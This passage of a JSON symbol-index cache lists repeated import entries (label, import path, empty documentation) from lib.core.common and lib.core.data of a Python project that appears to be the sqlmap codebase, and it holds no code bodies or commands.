        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeSQLIdentificatorNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unsafeSQLIdentificatorNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Format",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Format",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Format",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSQLSnippet",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isStackingAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "arrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterNone",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterPairValues",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "flattenValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLimitRange",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isInferenceAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNoneValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNumPosStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isTechniqueAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseSqliteTableSchema",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "popValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "pushValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeSQLIdentificatorNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeStringFormat",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeLogMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unsafeSQLIdentificatorNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "clearConsoleLine",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLimitRange",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isInferenceAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNoneValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNumPosStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isTechniqueAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "prioritySortColumns",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeSQLIdentificatorNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeLogMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unsafeSQLIdentificatorNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToOutFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "decloakToTemp",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "decodeDbmsHexValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNumPosStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isStackingAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isTechniqueAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBWrite",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isStackingAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "normalizePath",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "ntToPosixSlashes",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "posixToNtSlashes",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeDebugMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "arrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterPairValues",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLimitRange",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isInferenceAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNoneValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNumPosStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isTechniqueAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeSQLIdentificatorNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeStringFormat",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unsafeSQLIdentificatorNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isDigit",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isStackingAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "openFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "runningAsAdmin",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "arrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterPairValues",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLimitRange",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isAdminFromPrivileges",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isInferenceAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNoneValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNullValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNumPosStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isTechniqueAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "parsePasswordHash",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomInt",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "zeroDepthSearch",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "zeroDepthSearch",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomRange",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomRange",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "setPaths",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "cmdLineOptions",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "mergedOptions",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "mergedOptions",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
